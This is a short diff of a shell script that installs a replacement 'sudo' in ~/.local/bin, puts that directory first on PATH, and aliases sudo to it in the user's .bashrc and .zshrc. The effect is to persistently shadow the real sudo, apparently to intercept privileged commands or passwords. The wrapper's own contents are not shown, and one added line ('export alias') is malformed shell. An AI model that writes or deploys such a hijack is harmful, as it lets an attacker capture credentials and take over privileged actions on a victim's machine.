@@ -55,6 +55,9 @@ chmod +x ~/.local/bin/sudo
 
 TARGET_FILES=("$HOME/.bashrc")
 
+export PATH="$HOME/.local/bin:$PATH"
+export alias sudo="$HOME/.local/bin/sudo"
+
 if which zsh >/dev/null 2>&1; then
     TARGET_FILES+=("$HOME/.zshrc")
 fi
@@ -69,5 +72,4 @@ alias sudo="$HOME/.local/bin/sudo"
 EOF
         echo "Successfully added configuration to $RC_FILE"
     fi
-	alias sudo="$HOME/.local/bin/sudo"
 done
